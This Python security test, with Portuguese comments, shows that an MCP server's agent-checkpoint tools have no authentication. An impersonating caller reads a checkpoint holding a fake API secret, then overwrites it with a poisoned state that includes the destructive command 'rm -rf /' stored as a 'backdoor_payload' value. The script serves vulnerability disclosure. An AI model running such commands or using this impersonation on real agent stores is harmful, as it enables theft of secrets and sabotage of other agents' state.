import asyncio
import os
import sys
import tempfile
import json
sys.path.insert(0, os.path.abspath("."))

from storage.store import SqliteStore
from storage.vector_store import ChromaVectorStore
from core.middleware import GrafoConcierge
from ingestion.orchestrator import IngestionManager
from interface.mcp_server import GrafoConciergeServer

class MockEmbedder:
    def embed_text(self, text):
        return [0.1] * 384
    def embed_batch(self, texts):
        return [[0.1] * 384 for _ in texts]
    def get_dimension(self):
        return 384

async def run_impersonation_test():
    tmp_dir = tempfile.mkdtemp(prefix="test_checkpoint_impersonation_")
    db_path = os.path.join(tmp_dir, "test.db")
    chroma_dir = os.path.join(tmp_dir, "chroma")
    
    store = SqliteStore(db_path)
    vector = ChromaVectorStore(chroma_dir)
    embedder = MockEmbedder()
    im = IngestionManager(store, vector, embedder)
    gc = GrafoConcierge(store, vector, embedder, im)

    # Cria tabela agent_checkpoints caso ainda não exista no DDL base
    import sqlite3
    with sqlite3.connect(db_path) as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS agent_checkpoints (
                agent_id TEXT,
                session_id TEXT,
                checkpoint_id TEXT,
                state_blob TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                PRIMARY KEY (agent_id, session_id, checkpoint_id)
            );
        """)
        conn.commit()

    server = GrafoConciergeServer(gc)
    
    print("=" * 70)
    print("TESTE DE IMPERSONATION E ENVENENAMENTO DE CHECKPOINTS VIA session_id")
    print("=" * 70)
    
    # ── CENÁRIO 1: Vítima salva checkpoint com dados confidenciais ────────
    victim_agent_id = "legitimate_worker_agent"
    victim_session_id = "victim_session"
    checkpoint_id = "critical_step_42"
    
    victim_state = {
        "user_email": "ceo@enterprise.com",
        "api_secret_key": "sk-proj-SUPER_CONFIDENTIAL_KEY_XYZ",
        "work_status": "in_progress",
        "approved_budget": 500000
    }
    
    save_args_victim = {
        "agent_id": victim_agent_id,
        "session_id": victim_session_id,
        "checkpoint_id": checkpoint_id,
        "state_dict": victim_state
    }
    
    res_save = await server._mcp.call_tool("agent_save_checkpoint", save_args_victim)
    print(f"1. Vítima salvou checkpoint '{checkpoint_id}' em '{victim_session_id}':")
    print(f"   Resposta: {res_save}")
    
    # ── CENÁRIO 2: Atacante B impersona a vítima (mesmo session_id e agent_id) ──
    # Sem credencial, token ou vínculo de transporte no MCP
    list_args_attacker = {
        "agent_id": victim_agent_id,
        "session_id": victim_session_id
    }
    res_list = await server._mcp.call_tool("agent_list_checkpoints", list_args_attacker)
    print(f"\n2. Atacante B impersona a vítima e lista checkpoints:")
    print(f"   Checkpoints descobertos: {res_list}")
    
    # Leitura não autorizada (Exfiltração de Segredos)
    get_args_attacker = {
        "agent_id": victim_agent_id,
        "session_id": victim_session_id,
        "checkpoint_id": checkpoint_id
    }
    res_get_stolen = await server._mcp.call_tool("agent_get_checkpoint", get_args_attacker)
    print(f"\n3. Atacante B lê o checkpoint da vítima (agent_get_checkpoint):")
    print(f"   Dados roubados: {res_get_stolen}")
    
    leitura_sucesso = False
    if res_get_stolen:
        content_text = res_get_stolen[0].text if hasattr(res_get_stolen[0], "text") else str(res_get_stolen)
        if "sk-proj-SUPER_CONFIDENTIAL_KEY_XYZ" in content_text:
            leitura_sucesso = True
            print("   -> [COMPROVADO] LEITURA NÃO AUTORIZADA: Atacante exfiltrou 'api_secret_key' da vítima!")

    # ── CENÁRIO 3: Atacante B sobrescreve/envenena o checkpoint da vítima ────
    poisoned_state = {
        "user_email": "hacker@evil.com",
        "api_secret_key": "sk-proj-POISONED_KEY",
        "work_status": "corrupted",
        "approved_budget": 0,
        "backdoor_payload": "rm -rf /"
    }
    poison_args = {
        "agent_id": victim_agent_id,
        "session_id": victim_session_id,
        "checkpoint_id": checkpoint_id,
        "state_dict": poisoned_state
    }
    res_poison = await server._mcp.call_tool("agent_save_checkpoint", poison_args)
    print(f"\n4. Atacante B sobrescreve o checkpoint da vítima com payload malicioso:")
    print(f"   Resposta: {res_poison}")
    
    # ── CENÁRIO 4: Vítima tenta recuperar seu checkpoint legítimo ────────────
    res_victim_load = await server._mcp.call_tool("agent_get_checkpoint", {
        "agent_id": victim_agent_id,
        "session_id": victim_session_id,
        "checkpoint_id": checkpoint_id
    })
    print(f"\n5. Vítima retoma a sessão e lê seu checkpoint:")
    print(f"   Estado recuperado: {res_victim_load}")
    
    sobrescrita_sucesso = False
    if res_victim_load:
        content_text = res_victim_load[0].text if hasattr(res_victim_load[0], "text") else str(res_victim_load)
        if "POISONED_KEY" in content_text and "hacker@evil.com" in content_text:
            sobrescrita_sucesso = True
            print("   -> [COMPROVADO] ENVENENAMENTO DE ESTADO: O checkpoint da vítima foi substituído pelo payload do atacante!")

    # ── CENÁRIO 5: Atacante com agent_id diferente na mesma session_id ────────
    res_diff_agent = await server._mcp.call_tool("agent_get_checkpoint", {
        "agent_id": "different_unauthorized_agent",
        "session_id": victim_session_id,
        "checkpoint_id": checkpoint_id
    })
    print(f"\n6. Atacante tenta ler com agent_id='different_unauthorized_agent' e session_id='{victim_session_id}':")
    print(f"   Resposta: {res_diff_agent}")

    print("\n" + "=" * 70)
    print(f"SÍNTESE DOS RESULTADOS:")
    print(f"- Impersonation de Identidade / Exfiltração de Segredos: {'CONFIRMADA' if leitura_sucesso else 'FALHOU'}")
    print(f"- Envenenamento e Sobrescrita Arbitrária de Checkpoint: {'CONFIRMADA' if sobrescrita_sucesso else 'FALHOU'}")
    print(f"- Classificação de Gravidade: CRÍTICA (Nenhuma autenticação de sessão ou agente)")
    print("=" * 70)
    return leitura_sucesso and sobrescrita_sucesso

if __name__ == "__main__":
    asyncio.run(run_impersonation_test())
